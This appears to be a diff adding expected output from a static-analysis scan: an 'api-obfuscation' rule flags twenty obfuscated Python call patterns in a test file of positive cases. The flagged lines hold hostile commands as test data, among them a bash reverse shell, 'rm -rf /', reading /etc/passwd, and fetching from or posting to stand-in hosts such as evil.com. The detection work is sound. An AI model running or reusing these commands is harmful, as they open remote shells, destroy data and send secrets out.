@@ -1,0 +1,61 @@
+┌──────────────────┐
+│ 20 Code Findings │
+└──────────────────┘
+                                         
+    test_positive_cases.py
+    ❯❱ api-obfuscation
+          This package uses obfuscated API calls that may evade static analysis detection
+                                                                                         
+            5┆ os.__dict__['system']('ls')
+            ⋮┆----------------------------------------
+            9┆ os.__dict__['system'].__call__('whoami')
+            ⋮┆----------------------------------------
+           13┆ subprocess.__getattribute__('call')(['ls', '-la'])
+            ⋮┆----------------------------------------
+           17┆ subprocess.__getattribute__('call').__call__(['ps'])
+            ⋮┆----------------------------------------
+           20┆ __import__('os').system('id')
+            ⋮┆----------------------------------------
+           23┆ __import__('os').system.__call__('uname -a')
+            ⋮┆----------------------------------------
+           26┆ __import__('os').__dict__['system']('cat /etc/passwd')
+            ⋮┆----------------------------------------
+           29┆ __import__('os').__dict__['system'].__call__('netstat -an')
+            ⋮┆----------------------------------------
+           32┆ __import__('subprocess').__getattribute__('run')(['wget', 'malicious.com/payload'])
+            ⋮┆----------------------------------------
+           35┆ __import__('subprocess').__getattribute__('run').__call__(['curl', 'evil.com'])
+            ⋮┆----------------------------------------
+           39┆ getattr(os, 'system')('rm -rf /')
+            ⋮┆----------------------------------------
+           43┆ getattr(os, 'system').__call__('nc -l 4444')
+            ⋮┆----------------------------------------
+           46┆ getattr(__import__('os'), 'system')('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
+            ⋮┆----------------------------------------
+           49┆ getattr(__import__('os'), 'system').__call__('python -c "import socket..."')
+            ⋮┆----------------------------------------
+           53┆ json.__dict__['loads']('{"malicious": "payload"}')
+            ⋮┆----------------------------------------
+           57┆ urllib.request.__getattribute__('urlopen')('http://malicious.com')
+            ⋮┆----------------------------------------
+           60┆ result = getattr(__import__('subprocess'), 'check_output').__call__(['curl', '-X', 'POST',
+               'evil.com/exfiltrate'])                                                                   
+            ⋮┆----------------------------------------
+           64┆ socket.__dict__['socket'].__call__()
+            ⋮┆----------------------------------------
+           68┆ builtins.__getattribute__('eval')('malicious_code')
+            ⋮┆----------------------------------------
+           71┆ os.__dict__['getenv']()
+
+                
+                
+┌──────────────┐
+│ Scan Summary │
+└──────────────┘
+✅ Scan completed successfully.
+ • Findings: 20 (20 blocking)
+ • Rules run: 1
+ • Targets scanned: 1
+ • Parsed lines: ~100.0%
+ • No ignore information available
+Ran 1 rule on 1 file: 20 findings.
